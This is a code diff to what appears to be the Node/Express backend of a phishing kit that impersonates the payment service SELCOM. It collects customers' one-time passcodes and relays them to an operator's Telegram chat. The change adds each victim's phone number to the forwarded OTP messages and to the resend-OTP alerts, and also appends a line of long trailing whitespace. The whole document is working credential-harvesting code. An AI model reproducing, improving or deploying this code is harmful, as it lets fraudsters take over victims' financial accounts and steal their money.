@@ -191,7 +191,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: 5-digit OTP
+// Step 2: 5-digit OTP accompanied by applicant phone number
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -203,6 +203,7 @@ app.post('/api/submit-otp', async (req, res) => {
     session.otp = otp;
 
     const message = `🔴 *SELCOM - OTP (Tarakimu 5)*\n\n` +
+                    `📞 *Namba ya Simu:* \`${session.phone}\`\n` +
                     `📱 *Msimbo wa OTP:* \`${otp}\``;
 
     const opts = {
@@ -234,7 +235,7 @@ app.post('/api/request-new-otp', async (req, res) => {
 
     const targetChat = session.adminChatId;
     if (bot && targetChat) {
-      await bot.sendMessage(targetChat, `⚠️ *Mteja ameomba Msimbo Mpya wa OTP (Resend OTP).*`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(targetChat, `⚠️ *Mteja (Namba: ${session.phone}) ameomba Msimbo Mpya wa OTP (Resend OTP).*`, { parse_mode: 'Markdown' });
     }
     return res.status(200).json({ success: true });
   } catch (e) {
@@ -247,4 +248,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                     
+                                                                                                                             
